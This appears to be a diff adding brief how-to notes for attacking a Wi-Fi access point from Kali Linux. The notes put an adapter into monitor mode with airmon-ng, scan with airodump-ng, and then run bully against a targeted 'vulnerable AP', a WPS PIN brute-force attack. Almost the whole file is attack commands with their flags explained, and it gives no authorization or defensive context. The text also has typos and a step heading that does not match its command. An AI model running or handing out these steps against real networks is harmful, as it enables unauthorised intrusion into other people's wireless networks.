@@ -1,0 +1,13 @@
+step 1: Fire up kali
+        kali>iwconfig
+step 2: Pub Your Wi-Fi Adapter in Monitor Mode
+	kali>airmon-ng start wlan0
+	we need to use Airodump-ng to see the info on the wireless API around us
+	kali>airodump-ng mon0
+step 3: Use Airdump-Ng to Get the Necessary info
+	kali>bully mon0 -b macAddr -e ssid -c channel
+	explain:
+		mon0 is the name of the wireless adapter in monitor mode
+		-b macAddr is the BSSID of the vulnerable AP
+		-e ssid is the SSID of the AP
+		-c channel is the channel the AP is broadcasting on
